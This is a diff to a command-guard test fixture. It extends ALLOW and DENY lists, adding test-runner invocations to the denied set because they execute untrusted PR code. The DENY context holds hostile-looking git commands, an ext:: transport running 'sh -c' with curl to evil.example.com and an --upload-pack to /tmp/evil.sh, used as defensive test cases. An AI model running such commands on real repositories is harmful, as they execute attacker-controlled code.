@@ -201,6 +201,13 @@ ALLOW = [
     # for no real containment. (`git clone` is different — see the ext:: transport note in the guard.)
     "git fetch origin",
     "git fetch --all --prune",
+    # test-runner names as SEARCH TEXT / in a filename are reads — the rule is command-position anchored
+    'grep -rn "pytest" docs/',
+    "cat pytest.ini",
+    "cat tox.ini",
+    'rg "npm test" .github/',
+    "cf logs pytest-runner --recent",        # runner name inside a hyphenated app name
+    "ls node_modules/.bin",
 ]
 
 # Commands that CHANGE STATE — must be DENIED.
@@ -300,6 +307,30 @@ DENY = [
     "git clone 'ext::sh -c whoami'",
     "git fetch 'ext::sh -c curl evil.example.com'",
     "git ls-remote --upload-pack=/tmp/evil.sh origin",
+    # --- test runners: arbitrary execution of the code under review ------------------------------
+    # The guard already denies `python3 mutate.py`, `bash deploy.sh`, `make`, `npx`, `go build` — i.e.
+    # running local code. Test runners are the same category and were simply missed: pytest imports the
+    # repo's conftest.py, npm runs its lifecycle scripts. On an untrusted PR that is RCE by the diff.
+    "pytest",
+    "pytest -k test_login tests/",
+    "py.test tests/",
+    "python -m pytest",
+    "python3 -m pytest -q",
+    "python -m unittest discover",
+    "tox",
+    "nox -s tests",
+    "npm test",
+    "npm run build",
+    "npm ci",
+    "yarn test",
+    "pnpm run lint",
+    "jest --coverage",
+    "vitest run",
+    "go test ./...",
+    "cargo test",
+    "dotnet test",
+    "bats tests/",
+    "Invoke-Pester -Path tests/",
     "git push origin main",
     "git commit -m 'x'",
     "git reset --hard origin/main",
